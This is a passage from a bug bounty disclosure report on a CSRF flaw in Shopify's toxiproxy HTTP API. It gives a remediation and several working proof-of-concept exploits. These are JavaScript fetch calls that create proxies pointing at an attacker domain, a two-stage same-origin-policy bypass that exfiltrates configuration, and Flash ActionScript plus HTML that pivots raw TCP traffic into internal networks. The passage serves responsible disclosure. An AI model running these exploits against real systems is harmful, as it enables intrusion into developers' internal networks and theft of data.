split-DNS provider. The impact of this access is highly dependent on what systems are accessible without authentication (or with weak auth) within the Shopify internal network, I&#39;ll choose not to speculate there and let the Shopify team better assess the impact.</p>\n\n<h1 id=\"remediation\">Remediation</h1>\n\n<p>The API should implement some form of CSRF protection, ideally by just placing the entire API behind authentication.</p>\n\n<h1 id=\"environment-setup\">Environment Setup</h1>\n\n<p>All exploits described in this report were tested on <code>macOS Sierra 10.12.3 (16D32)</code> against <code>toxiproxy v2.1.1</code> (latest at the time of submission) which was installed as follows:</p>\n<pre class=\"highlight plaintext\"><code>$ brew update\n    [snip]\n$ brew install toxiproxy\n    ==&gt; Installing toxiproxy from shopify/shopify\n    ==&gt; Downloading https://github.com/Shopify/toxiproxy/releases/download/v2.1.1/toxiproxy-server\n    Already downloaded: /Users/luke/Library/Caches/Homebrew/toxiproxy-2.1.1\n    ==&gt; Downloading https://github.com/Shopify/toxiproxy/releases/download/v2.1.1/toxiproxy-cli-da\n    Already downloaded: /Users/luke/Library/Caches/Homebrew/toxiproxy--cli-2.1.1\n    ==&gt; Caveats\n    To have launchd start shopify/shopify/toxiproxy now and restart at login:\n      brew services start shopify/shopify/toxiproxy\n    Or, if you don&#39;t want/need a background service you can just run:\n      toxiproxy\n    ==&gt; Summary\n    \ud83c\udf7a  /usr/local/Cellar/toxiproxy/2.1.1: 5 files, 13.4MB, built in 1 second\n$ brew services start shopify/shopify/toxiproxy\n    ==&gt; Successfully started `toxiproxy` (label: homebrew.mxcl.toxiproxy)\n</code></pre>\n<p>A number of servers have been setup on <a href=\"/redirect?signature=ce6141316c85bb0db2719b0d31703edac5009432&amp;url=http%3A%2F%2Ftoxiproxy.attackerdoma.in\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>toxiproxy.attackerdoma.in</span><i class=\"icon-external-link\"></i></a> to facilitate the PoCs, the source code for these can be found at the following private gist: <a href=\"/redirect?signature=cc617a93eee3f0b5603e65fa67a18e978be58acc&amp;url=https%3A%2F%2Fgist.github.com%2Fbored-engineer%2F50aa6591f307d51c28b4be71dd80f8a9\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>gist.github.com/bored-engineer/50aa6591f307d51c28b4be71dd80f8a9</span><i class=\"icon-external-link\"></i></a>. Please note that these are servers are hosted on ephemeral instance and likely will not remain online after the report has been triaged and resolved. </p>\n\n<h1 id=\"poc-create-a-new-proxy\">PoC - Create a new proxy</h1>\n\n<p>Demonstrating the issue is fundamentally pretty simple and can be done as follows...</p>\n\n<p>PoC available at: <a href=\"/redirect?signature=d91e96ea068b23e8eed47f8ff07bdb1f3e128337&amp;url=http%3A%2F%2Fattackerdoma.in%2F7c9e1586-ab53-48d7-9704-165865a90ab1.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>attackerdoma.in/7c9e1586-ab53-48d7-9704-165865a90ab1.html</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"s2\">&quot;http://localhost:8474/proxies&quot;</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n        <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;csrf&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:2773&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"s2\">&quot;toxiproxy.attackerdoma.in:12773&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n    <span class=\"p\">}),</span>\n<span class=\"p\">});</span>\n</code></pre>\n<p>You can verify the PoC worked correctly by either accessing the new proxy at <a href=\"/redirect?signature=3b2104f178c2a47debb2ea1c8ec598ae1f52e6a7&amp;url=http%3A%2F%2F127.0.0.1%3A2773%2F1efb54c5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:2773/1efb54c5</span><i class=\"icon-external-link\"></i></a> or via the <a href=\"/redirect?signature=c2b5bc686bb6a88555c2550de28d6276b8be6c11&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy%23cli-example\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>toxiproxy-cli</span><i class=\"icon-external-link\"></i></a>:</p>\n<pre class=\"highlight plaintext\"><code>$ toxiproxy-cli inspect csrf\nName: csrf  Listen: 127.0.0.1:2773  Upstream: toxiproxy.attackerdoma.in:2773\n======================================================================\nProxy has no toxics enabled.\n</code></pre>\n<h1 id=\"poc-bypass-sop-to-read-current-state\">PoC - Bypass SOP to read current state</h1>\n\n<p>While we can CSRF the creation of proxies, we cannot read the current toxiproxy state which could contain useful information for an attacker as it is blocked by <a href=\"/redirect?signature=a73778c0baec7060bf2f6780af217ad93f4685b0&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSame-origin_policy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>SOP</span><i class=\"icon-external-link\"></i></a>. We can bypass this restriction by executing the following steps:</p>\n\n<ol>\n<li>CSRF create a new <code>pivot</code> proxy pointing to <code>http://attackerdoma.in:17486</code>\n</li>\n<li>Redirect the webpage to the new <code>pivot</code> proxy</li>\n<li>From the new webpage use the CSRF to change the upstream for the <code>pivot</code> proxy to point to <code>http://127.0.0.1:8474</code> (the toxiproxy HTTP API)</li>\n<li>Make a XHR request to read the configuration (because the browser believes it is still communicating with the same origin, this is allowed)</li>\n</ol>\n\n<p>PoC available at: <a href=\"/redirect?signature=9f65702b2c55e69071768b0fbf5de12b714cccd3&amp;url=http%3A%2F%2Fattackerdoma.in%2Fa10f2786-7149-43e8-8a90-b3fa46caafd5.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>attackerdoma.in/a10f2786-7149-43e8-8a90-b3fa46caafd5.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The PoC for this consists of two stages...</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// Get the instance we are exploiting</span>\n<span class=\"kd\">let</span> <span class=\"nx\">toxiproxy</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">URL</span><span class=\"p\">(</span><span class=\"nx\">prompt</span><span class=\"p\">(</span><span class=\"s2\">&quot;Enter the URL of the toxiproxy instance you would like to CSRF:&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;http://localhost:8474&quot;</span><span class=\"p\">));</span>\n<span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;proxies&quot;</span><span class=\"p\">;</span>\n<span class=\"c1\">// CSRF creation of the proxy</span>\n<span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n        <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;pivot&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:7486&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"s2\">&quot;toxiproxy.attackerdoma.in:17486&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n    <span class=\"p\">}),</span>\n<span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// There is a chance the &quot;pivot&quot; proxy already exists, if so modify it instead</span>\n    <span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;proxies/pivot&quot;</span>\n    <span class=\"k\">return</span> <span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n        <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n            <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;pivot&quot;</span><span class=\"p\">,</span>\n            <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:7486&quot;</span><span class=\"p\">,</span>\n            <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"s2\">&quot;toxiproxy.attackerdoma.in:17486&quot;</span><span class=\"p\">,</span>\n            <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n        <span class=\"p\">}),</span>\n    <span class=\"p\">})</span>\n<span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// Redirect to the PoC, passing the toxiproxy URL used (in-case it was custom)</span>\n    <span class=\"kd\">let</span> <span class=\"nx\">pivotproxy</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">URL</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">);</span>\n    <span class=\"nx\">pivotproxy</span><span class=\"p\">.</span><span class=\"nx\">port</span> <span class=\"o\">=</span> <span class=\"mi\">7486</span><span class=\"p\">;</span>\n    <span class=\"nx\">pivotproxy</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;3450b92c&quot;</span><span class=\"p\">;</span>\n    <span class=\"nx\">pivotproxy</span><span class=\"p\">.</span><span class=\"nx\">hash</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;#&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">();</span>\n    <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">href</span> <span class=\"o\">=</span> <span class=\"nx\">pivotproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">();</span>\n<span class=\"p\">});</span>\n</code></pre>\n<p>Followed by the second stage:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// CSRF the proxy to point to it&#39;s own HTTP interface</span>\n<span class=\"kd\">let</span> <span class=\"nx\">toxiproxy</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">URL</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">hash</span><span class=\"p\">.</span><span class=\"nx\">substring</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">));</span>\n<span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;/proxies/pivot&quot;</span><span class=\"p\">;</span>\n<span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n        <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;pivot&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:7486&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">host</span><span class=\"p\">,</span>\n        <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n    <span class=\"p\">}),</span>\n<span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// Fetch the list of proxies from ourself (allows because it&#39;s same-origin)</span>\n    <span class=\"kd\">let</span> <span class=\"nx\">self</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">URL</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">href</span><span class=\"p\">);</span>\n    <span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;/proxies&quot;</span><span class=\"p\">;</span>\n    <span class=\"k\">return</span> <span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n        <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;GET&quot;</span><span class=\"p\">,</span>\n    <span class=\"p\">})</span>\n<span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">((</span><span class=\"nx\">r</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">json</span><span class=\"p\">()).</span><span class=\"nx\">then</span><span class=\"p\">((</span><span class=\"nx\">conf</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;pre&gt;Exfiltrated the following toxiproxy configuration:\\n&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">(</span><span class=\"nx\">conf</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">&quot;&lt;/pre&gt;&quot;</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</code></pre>\n<h1 id=\"poc-connect-to-arbitrary-hosts-and-read-write-arbitrary-tcp-data\">PoC - Connect to arbitrary hosts and read/write arbitrary TCP data</h1>\n\n<p>While reading and writing HTTP traffic is fun, the holy grail of internal network access is the ability to read/write arbitrary TCP traffic. This is actually possible due to Adobe Flash. Flash has had the ability to read/write raw TCP sockets for a number of years however it requires that the TCP server it connects to respond with a <a href=\"/redirect?signature=05ad180beb9d1c7abcb9ed71ff1c81773d03554b&amp;url=http%3A%2F%2Fwww.adobe.com%2Fdevnet%2Fflashplayer%2Farticles%2Fsocket_policy_files.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>socket policy file</span><i class=\"icon-external-link\"></i></a> when requested. Thankfully, per the documentation, once flash has received permission it will cache it indefinitely (per IP/port pair):</p>\n\n<blockquote>\n<p>Once Flash Player receives permission, it will remember the result for the lifetime of the SWF file. Flash Player associates each socket policy file to an IP address, and it needs a policy file for each connection to a new IP address. For instance, assume that the developer specifies a hostname for the connection and that a DNS lookup returns multiple IP addresses. Every time the IP address changes for the hostname, Flash Player will check the new IP address for a socket policy file. This helps to protect against DNS rebinding attacks.</p>\n</blockquote>\n\n<p>By using a similar technique as the previous PoC we can swap out the upstream proxy once this permission has been granted and cached, allowing us to read/write arbitrary TCP traffic within the network. The attack looks like this:</p>\n\n<ol>\n<li>Load a specially crafted SWF file which we will use to send the data</li>\n<li>CSRF create a new <code>policy</code> proxy pointing to <code>attackerdoma.in:17654</code>\n</li>\n<li>Trigger the SWF to open a socket to the <code>policy</code> proxy which will grant full permissions (and be cached for the lifetime of the SWF) </li>\n<li>Use the CSRF to change the upstream for the <code>pivot</code> proxy to point to our target TCP address.</li>\n<li>Make arbitrary TCP connections from the SWF</li>\n</ol>\n\n<p>The PoC for this consists of two parts...<br>\nPoC available at: <a href=\"/redirect?signature=1fb603c38e74d4003cb03595af33b3e6e52e6dab&amp;url=http%3A%2F%2Fattackerdoma.in%2F0761bfa0-b69a-436b-a474-c67b04157abd.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>attackerdoma.in/0761bfa0-b69a-436b-a474-c67b04157abd.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The ActionScript for the SWF file is as follows (compiled with the Adobe Flex SDK 4.6):</p>\n<pre class=\"highlight actionscript\"><code><span class=\"kr\">package</span> <span class=\"p\">{</span>\n    <span class=\"kr\">import</span> <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">display</span><span class=\"p\">.</span><span class=\"nx\">Sprite</span><span class=\"o\">;</span>\n    <span class=\"kr\">import</span> <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">net</span><span class=\"p\">.</span><span class=\"nx\">Socket</span><span class=\"o\">;</span>\n    <span class=\"kr\">import</span> <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">system</span><span class=\"p\">.</span><span class=\"nx\">Security</span><span class=\"o\">;</span>\n    <span class=\"kr\">import</span> <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">events</span><span class=\"p\">.</span><span class=\"o\">*;</span>\n    <span class=\"kr\">import</span> <span class=\"nx\">flash</span><span class=\"p\">.</span><span class=\"nx\">external</span><span class=\"p\">.</span><span class=\"nx\">ExternalInterface</span><span class=\"o\">;</span>\n\n    <span class=\"kr\">public</span> <span class=\"kr\">class</span> <span class=\"nx\">Main</span> <span class=\"kr\">extends</span> <span class=\"nx\">Sprite</span> <span class=\"p\">{</span>\n\n        <span class=\"kr\">public</span> <span class=\"kd\">function</span> <span class=\"nx\">Main</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n            <span class=\"nx\">Security</span><span class=\"p\">.</span><span class=\"nx\">allowDomain</span><span class=\"p\">(</span><span class=\"s2\">&quot;*&quot;</span><span class=\"p\">)</span><span class=\"o\">;</span>\n            <span class=\"nx\">Security</span><span class=\"p\">.</span><span class=\"nx\">allowInsecureDomain</span><span class=\"p\">(</span><span class=\"s2\">&quot;*&quot;</span><span class=\"p\">)</span><span class=\"o\">;</span>\n            <span class=\"nx\">ExternalInterface</span><span class=\"p\">.</span><span class=\"nx\">addCallback</span><span class=\"p\">(</span><span class=\"s2\">&quot;connect&quot;</span><span class=\"p\">,</span> <span class=\"nx\">connect</span><span class=\"p\">)</span><span class=\"o\">;</span>\n            <span class=\"nx\">ExternalInterface</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"s2\">&quot;onready&quot;</span><span class=\"p\">)</span><span class=\"o\">;</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"kr\">public</span> <span class=\"kd\">function</span> <span class=\"nx\">dataHandler</span><span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"o\">:</span><span class=\"nx\">ProgressEvent</span><span class=\"p\">)</span><span class=\"o\">:</span><span class=\"nb\">void</span> <span class=\"p\">{</span> \n            <span class=\"kd\">var</span> <span class=\"nx\">socket</span><span class=\"o\">:</span><span class=\"nx\">Socket</span> <span class=\"o\">=</span> <span class=\"nx\">event</span><span class=\"p\">.</span><span class=\"nx\">target</span> <span class=\"nx\">as</span> <span class=\"nx\">Socket</span><span class=\"o\">;</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">msg</span><span class=\"o\">:</span><span class=\"nx\">String</span> <span class=\"o\">=</span> <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">readUTFBytes</span><span class=\"p\">(</span><span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">bytesAvailable</span><span class=\"p\">)</span><span class=\"o\">;</span> \n            <span class=\"nx\">ExternalInterface</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"s2\">&quot;onsocketdata&quot;</span><span class=\"p\">,</span> <span class=\"nx\">escape</span><span class=\"p\">(</span><span class=\"nx\">msg</span><span class=\"p\">))</span><span class=\"o\">;</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"kr\">public</span> <span class=\"kd\">function</span> <span class=\"nx\">closeHandler</span><span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"o\">:</span><span class=\"nx\">Event</span><span class=\"p\">)</span><span class=\"o\">:</span><span class=\"nb\">void</span> <span class=\"p\">{</span> \n            <span class=\"nx\">ExternalInterface</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"s2\">&quot;onsocketclose&quot;</span><span class=\"p\">)</span><span class=\"o\">;</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"kr\">public</span> <span class=\"kd\">function</span> <span class=\"nx\">connect</span><span class=\"p\">(</span><span class=\"nx\">host</span><span class=\"o\">:</span><span class=\"nx\">String</span><span class=\"p\">,</span> <span class=\"nx\">port</span><span class=\"o\">:</span><span class=\"nx\">int</span><span class=\"p\">,</span> <span class=\"nx\">msg</span><span class=\"o\">:</span><span class=\"nx\">String</span><span class=\"p\">)</span><span class=\"o\">:</span><span class=\"nx\">String</span> <span class=\"p\">{</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">socket</span><span class=\"o\">:</span><span class=\"nx\">Socket</span><span class=\"o\">;</span>\n            <span class=\"nx\">socket</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Socket</span><span class=\"p\">()</span><span class=\"o\">;</span>\n            <span class=\"k\">try</span> <span class=\"p\">{</span>\n                <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">connect</span><span class=\"p\">(</span><span class=\"nx\">host</span><span class=\"p\">,</span> <span class=\"nx\">port</span><span class=\"p\">)</span><span class=\"o\">;</span>\n                <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">writeUTFBytes</span><span class=\"p\">(</span><span class=\"nx\">msg</span><span class=\"p\">)</span><span class=\"o\">;</span> \n                <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"nx\">Event</span><span class=\"p\">.</span><span class=\"nx\">CLOSE</span><span class=\"p\">,</span> <span class=\"nx\">closeHandler</span><span class=\"p\">)</span><span class=\"o\">;</span>\n                <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"nx\">ProgressEvent</span><span class=\"p\">.</span><span class=\"nx\">SOCKET_DATA</span><span class=\"p\">,</span> <span class=\"nx\">dataHandler</span><span class=\"p\">)</span><span class=\"o\">;</span> \n                <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">flush</span><span class=\"p\">()</span><span class=\"o\">;</span> \n            <span class=\"p\">}</span> <span class=\"k\">catch</span> <span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"nx\">Error</span><span class=\"p\">)</span> <span class=\"p\">{</span> \n                <span class=\"nx\">socket</span><span class=\"p\">.</span><span class=\"nx\">close</span><span class=\"p\">()</span><span class=\"o\">;</span> \n                <span class=\"k\">return</span> <span class=\"nx\">error</span><span class=\"p\">.</span><span class=\"nx\">message</span><span class=\"o\">;</span>\n            <span class=\"p\">}</span> \n            <span class=\"k\">return</span> <span class=\"s2\">&quot;&quot;</span><span class=\"o\">;</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>The HTML/JS for the PoC is as follows:</p>\n<pre class=\"highlight html\"><code><span class=\"cp\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n    <span class=\"nt\">&lt;head&gt;</span>\n        <span class=\"nt\">&lt;script&gt;</span>\n            <span class=\"c1\">// Called by flash once loaded</span>\n            <span class=\"kd\">function</span> <span class=\"nx\">onready</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n                <span class=\"c1\">// Get access to the flash objects</span>\n                <span class=\"kd\">let</span> <span class=\"nx\">flash</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s2\">&quot;flash&quot;</span><span class=\"p\">);</span>\n                <span class=\"c1\">// Get the instance we are exploiting</span>\n                <span class=\"kd\">let</span> <span class=\"nx\">toxiproxy</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">URL</span><span class=\"p\">(</span><span class=\"nx\">prompt</span><span class=\"p\">(</span><span class=\"s2\">&quot;Enter the URL of the toxiproxy instance you would like to CSRF:&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;http://localhost:8474&quot;</span><span class=\"p\">));</span>\n                <span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;proxies&quot;</span><span class=\"p\">;</span>\n                <span class=\"c1\">// CSRF creation of the proxy</span>\n                <span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n                    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n                    <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n                    <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n                        <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;policy&quot;</span><span class=\"p\">,</span>\n                        <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:7654&quot;</span><span class=\"p\">,</span>\n                        <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"s2\">&quot;toxiproxy.attackerdoma.in:17654&quot;</span><span class=\"p\">,</span>\n                        <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n                    <span class=\"p\">}),</span>\n                <span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n                    <span class=\"c1\">// There is a chance the &quot;policy&quot; proxy already exists, if so modify it instead</span>\n                    <span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">pathname</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;proxies/policy&quot;</span>\n                    <span class=\"k\">return</span> <span class=\"nx\">fetch</span><span class=\"p\">(</span><span class=\"nx\">toxiproxy</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(),</span> <span class=\"p\">{</span>\n                        <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n                        <span class=\"na\">mode</span><span class=\"p\">:</span> <span class=\"s2\">&quot;no-cors&quot;</span><span class=\"p\">,</span>\n                        <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n                            <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"s2\">&quot;policy&quot;</span><span class=\"p\">,</span>\n                            <span class=\"na\">listen</span><span class=\"p\">:</span> <span class=\"s2\">&quot;0.0.0.0:7654&quot;</span><span class=\"p\">,</span>\n                            <span class=\"na\">upstream</span><span class=\"p\">:</span> <span class=\"s2\">&quot;toxiproxy.attackerdoma.in:17654&quot;</span><span class=\"p\">,</span>\n                            <span class=\"na\">enabled</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n                        <span class=\"p\">}),</span>\n                    <span class=\"p\">});</span>\n                <span class=\"p\">}).</span><span class=\"nx\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n                    <span class=\"c1\">// Once the socket has connected the first time our policy is cached</span>\n                    <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onsocketclose</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n                        <span class=\"c1\">// Change the proxy to point to the target</span>\n                        <span class=\"kd\">let</span> <span 